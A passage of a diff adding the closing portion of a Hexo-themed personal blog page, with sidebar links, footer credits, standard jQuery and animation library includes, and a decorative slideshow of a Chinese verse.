+      <a href="/categories"><div><strong>0</strong><br>分类</div></a>
+      <a href="/tags"><div><strong>0</strong><br>标签</div></a>
+    </div>
+
+
+
+    <div class="social-link">
+      
+        <a class="hvr-bounce-in" href="http://github.com/ShanaMaid" target="_blank" title="Github">
+          Github
+        </a>
+      
+    </div>
+
+    <div class="friend-link">
+      <h2>友链</h2>
+      
+        <a class="hvr-bounce-in" href="http://blog.shanamaid.top/" target="_blank" title="ShanaMaid">
+          ShanaMaid
+        </a>
+      
+    </div>
+  </div>
+</div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy;2020 - 2021 Ash3n On3<br>
+      由<a href="http://hexo.io/" target="_blank">Hexo</a>强力驱动 | 
+      主题-<a target="_blank" rel="noopener" href="https://github.com/ShanaMaid/hexo-theme-shana">Shana</a>
+      
+    </div>
+    
+  </div>
+</footer>
+    </div>
+    
+
+<script src="//apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script>
+<script src="//apps.bdimg.com/libs/wow/0.1.6/wow.min.js"></script>
+<script>
+new WOW().init();
+</script>   
+
+
+  
+<link rel="stylesheet" href="/plugin/fancybox/jquery.fancybox.css">
+
+  
+<script src="/plugin/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+  <section class="hidden-xs"> 
+  <ul class="cb-slideshow"> 
+    <li><span>苟利</span></li> 
+    <li><span>国家</span></li> 
+    <li><span>生死以</span></li> 
+    <li><span>岂能</span></li> 
+    <li><span>祸福</span></li> 
+    <li><span>趋避之</span></li> 
+  </ul>
+</section>
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+</body>
+</html>
